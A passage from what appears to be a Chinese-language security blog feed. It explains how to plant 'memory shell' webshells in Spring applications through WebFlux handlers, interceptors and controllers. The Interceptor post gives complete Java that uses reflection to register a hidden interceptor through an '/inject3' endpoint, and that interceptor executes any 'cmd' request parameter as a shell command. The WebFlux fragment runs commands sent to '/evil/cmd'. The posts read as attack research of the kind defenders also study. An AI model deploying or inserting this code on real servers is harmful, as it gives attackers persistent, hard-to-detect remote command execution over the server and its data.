request.getURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> request.getURI().getQuery();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.equals(<span class="string">&quot;/evil/cmd&quot;</span>) &amp;&amp; query != <span class="literal">null</span> &amp;&amp; query.startsWith(<span class="string">&quot;command=&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> query.substring(<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds);</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                    Flux&lt;DataBuffer&gt; response = Flux.create(sink -&gt; &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            String line;</span><br><span class="line">                            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                                sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">                            &#125;</span><br><span class="line">                            sink.complete();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">                    &#125;);</span><br><span class="line"></span><br><span class="line">                    exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);</span><br><span class="line">                    <span class="keyword">return</span> response;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> Flux.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/19/Spring-WebFlux/1713518745557-17285471-7f80-4963-b5f3-2bd1b7cdeb0c.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MemoryShell Of Interceptor</title>
      <link href="/2024/05/19/Spring-Interceptor/"/>
      <url>/2024/05/19/Spring-Interceptor/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring Interceptor和Tomcat Filter过滤器很类似，区别如下：</p><ul><li>Interceptor基于反射，Filter基于函数回调</li><li>Interceptor不依赖Servlet容器</li><li>Interceptor只能对Action请求有用</li><li>Interceptor可以访问Action上下文，栈里的对象，而Filter不能</li><li>Action生命周期中，Interceptor可以被多次调用，而Filter只在容器初始化时调用一次</li><li>Interceptor可以获取IOC容器中的Bean，而Filter不行</li></ul><p>由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作。</p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>Interceptor拦截过程如下：</p><ul><li>程序先执行preHandle方法，如果该方法的返回值为true，则程序会继续向下执行处理器中的方法，否则将不再向下执行</li><li>控制器Controller类处理完请求后，会执行postHandle方法，然后会通过DispatcherServlet向客户端返回响应</li><li>在DispatcherServlet处理完请求后，才会执行afterCompletion方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拦截类</span></span><br><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 如果返回false, 整个请求到这里就结束, 不再执行后面的拦截器以及Controller的处理.</span></span><br><span class="line"><span class="comment">         * 如果返回true, 则继续执行后面的拦截器以及Controller的处理.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.out.println(<span class="string">&quot;MyInterceptor preHandle() called...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyInterceptor postHandle() called...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyInterceptor afterCompletion() called, which means the request and response is completed...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置类</span></span><br><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptorAppConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TestInterceptor testInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(testInterceptor).addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在TestInterceptorAppConfig#addInterceptors方法中下断点，观察堆栈信息，可以看到URL映射处理器RequestMappingHandlerMapping会调用setInterceptors方法将Spring IoC容器中所有的Interceptor保存到自己的interceptors属性中。</p><p><img src="/2024/05/19/Spring-Interceptor/1713495355735-e587e95f-dfe3-40f1-9253-9025bf0d9dcf.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Interceptor/1713495391436-e4d814b9-84cc-444c-8e17-9385f31229c4.png" alt="image.png"></p><p>接着继续运行至Springboot启动完成，访问路由&#x2F;test&#x2F;index，发现会执行自定义的拦截器，当preHandle返回值为true时，会继续向下执行另外两个。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496089513-30d06fcc-1407-472b-addd-677161e0ed95.png" alt="image.png"></p><p>观察堆栈信息，发现在执行了doDispatch#applyPreHandle方法之后，interceptorList中已经有自定义的拦截器了。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496393644-196f3867-e478-43fe-8a88-939fb3dd8ad7.png" alt="image.png"></p><p>跟进一下doDispatch#applyPreHandle方法，发现会调用preHandle方法，因此，需要注册拦截的话一定是在这之前。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496434093-87b53a34-9db0-4c09-83c1-b8d7d19e9144.png" alt="image.png"></p><p>观察一下注册流程，先调用checkMultipart方法判断request是否为文件上传请求，不是的话则会原样返回，接着调用getHandler方法，将getHandler方法执行后的结果返回给mappedHandler。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496782074-ca71d527-7e61-46df-81dc-f74a6a0c64b3.png" alt="image.png"></p><p>跟进getHandler方法，会调用到org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler方法，接着会调用getHandlerExecutionChain方法。</p><p><img src="/2024/05/19/Spring-Interceptor/1713496847344-0ca7e300-87e8-42ad-b779-336bcef98de9.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Interceptor/1713496976411-f31596d8-aa5b-44c2-8c68-98558f885c8e.png" alt="image.png"></p><p>跟进getHandlerExecutionChain方法，会遍历this.adaptedInterceptors对象里所有的HandlerInterceptor类实例，通过HandlerExecutionChain#addInterceptor方法把已有的所有拦截器加入到需要返回的HandlerExecutionChain exectuion属性中，完成注册。</p><p><img src="/2024/05/19/Spring-Interceptor/1713497069980-a6424c81-ca74-4e57-a843-449070978f6b.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Interceptor/1713497365101-6e72d641-22d5-4b96-ace1-64adf5004df7.png" alt="image.png"></p><p>通过上文的分析，要注入Interceptor内存马，只要将Interceptor对象封装到MappedInterceptor对象中，然后将MappedInterceptor对象添加List集合adaptedInterceptors中即可。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>动态注册Spring Interceptor内存马的具体思路如下：</p><ul><li>获取Context</li><li>获取AbstractHandlerMapping</li><li>获取adaptedInterceptors属性</li><li>构造MappedInterceptor</li><li>调用adaptedInterceptors#add方法添加构造的mappedInterceptor对象</li></ul><h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.MappedInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringInterceptorMemShell1</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/inject3&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SpringInterceptorMemShell1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            ArrayList&lt;HandlerInterceptor&gt; adaptedInterceptors = (ArrayList&lt;HandlerInterceptor&gt;)field.get(mappingHandlerMapping);</span><br><span class="line"></span><br><span class="line">            <span class="type">MappedInterceptor</span> <span class="variable">mappedInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MappedInterceptor</span>(<span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">InjectInterceptor</span>());</span><br><span class="line">            adaptedInterceptors.add(mappedInterceptor);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InjectInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/19/Spring-Interceptor/1713498183791-9fee0dc6-4fb9-4af0-950b-d525259928b5.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MemoryShell Of Controller</title>
      <link href="/2024/05/19/Spring-Controller/"/>
      <url>/2024/05/19/Spring-Controller/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring是一个开源容器框架，其核心就是控制反转（IOC）和面向切面（AOP）。Spring作为Java框架，核心组件为Core、Context和Bean，使用Spring的主要一个原因就是Spring会把对象之间的依赖关系转而用配置文件来管理，也就是依赖注入机制。</p><ul><li>Bean组件：Bean是Spring核心中的重点，Bean组件在Spring的org.springframework.beans包下，在这个包下的所有类主要解决了3件事，Bean的定义、创建及解析。</li><li>Context组件：Context又叫IOC容器，Context组件在Spring的org.springframework.context包下，给Spring提供一个运行时的环境，用于保存各个对象的状态。</li><li>Core组件：Core为处理对象间关系的方法，作为Spring的核心组件，其中包含了很多关键类，例如，定义资源的访问方式。</li></ul><p>SpringMVC是一种WEB层MVC框架，用于替代Servlet。在SpringMVC框架中，DispatcherServlet负责分发请求到控制器Controller进行处理，Controller则把用户的请求数据经过业务层处理后封装成一个ModelAndView对象，然后再把该对象返回给对应的View进行展示。在SpringMVC中定义一个Controller是非常简单的，不需要继承特定的类，也不需要实现相关接口，只需使用@Controller注解在一个类上进行标记即可。然后使用@RequestMapping等一些注解用定义URL请求和映射，这样Controller就能被访问。</p><p>而Spring内存马一般的构造方式就是模拟组件注册，从而来注入恶意组件，Spring Controller型内存马就是通过动态注册Controller来实现的。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>新建Spring项目，设置Server URL为<a href="https://start.aliyun.com/%E3%80%82">https://start.aliyun.com/。</a></p><p><img src="/2024/05/19/Spring-Controller/1713416564663-d25202a8-17fc-4749-8d26-7af92184bfbe.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello Contoller...&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><h3 id="注册Context"><a href="#注册Context" class="headerlink" title="注册Context"></a>注册Context</h3><p>在之前分析Tomcat型内存马和中间件型内存马时，要成功打入内存马，一个很重要的点就是先获取当前运行环境的上下文，在Spring应用中可以同时有多个Context，但其中只有一个Root Context，其余的均为Child Context，所有Child Context都可以访问在Root Context中定义的Bean，但是Root Context无法访问Child Context中定义的Bean，并且所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。</p><h4 id="Root-Context"><a href="#Root-Context" class="headerlink" title="Root Context"></a>Root Context</h4><ul><li>ContextLoader#getCurrentWebApplicationContext方法，Root Context是由ContextLoaderListener触发监听后ContextLoader所创建，因此，ContextLoader类中也相应的获取方法，即getCurrentWebApplicationContext方法。</li></ul><p><img src="/2024/05/19/Spring-Controller/1713419026876-d1d87036-a5e1-449d-8044-7c95bb9569a4.png" alt="image.png"></p><ul><li>WebApplicationContextUtils#getWebApplicationContext方法，由于所有的Context在创建后，都会被作为一个属性添加到了ServletContext中，因此，可以借助servletContext来获取Root Context。</li></ul><p><img src="/2024/05/19/Spring-Controller/1713418210868-7df74227-dcde-4880-9b0e-e3fb61197922.png" alt="image.png"></p><ul><li>ApplicationContext#getAttribute，ApplicationContext实现了ServletContext接口，getAttribute方法通过传入名称来获取上下文。</li></ul><p><img src="/2024/05/19/Spring-Controller/1713419338309-177e3657-8e6e-4a17-9d7a-5e1a9d7b7b1e.png" alt="image.png"></p><h4 id="Child-Context"><a href="#Child-Context" class="headerlink" title="Child Context"></a>Child Context</h4><ul><li>RequestContextUtils#getWebApplicationContext：，在request中存放着Child Context，因此可以借助request来获取Child Context，但是在较新Spring版本中已没有getWebApplicationContext方法。</li><li>Request#getAttribute，同样是借助request来获取Child Context，不过这里利用的是getAttribute方法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Root WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Root WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child WebApplicationContext</span></span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="literal">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure><h3 id="注册Controller"><a href="#注册Controller" class="headerlink" title="注册Controller"></a>注册Controller</h3><ul><li>Spring 2.5开始到Spring 3.1之前一般使用org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping映射器</li><li>Spring 3.1开始及以后一般开始使用新的org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping映射器来支持@Contoller和@RequestMapping注解</li></ul><p>在org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping中存在方法registerMapping，其会调用父类的registerMapping方法，然后调用register方法完成注册。</p><p><img src="/2024/05/19/Spring-Controller/1713421598568-61c5ec79-cd86-445b-95fe-d590c2043894.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Controller/1713421666603-5a9947d5-83c1-44ca-84ec-41f851ca7635.png" alt="image.png"></p><p><img src="/2024/05/19/Spring-Controller/1713422496592-6e0479f9-abc0-4bfc-9191-cee742bd0a82.png" alt="image.png"></p><h3 id="注册流程"><a href="#注册流程" class="headerlink" 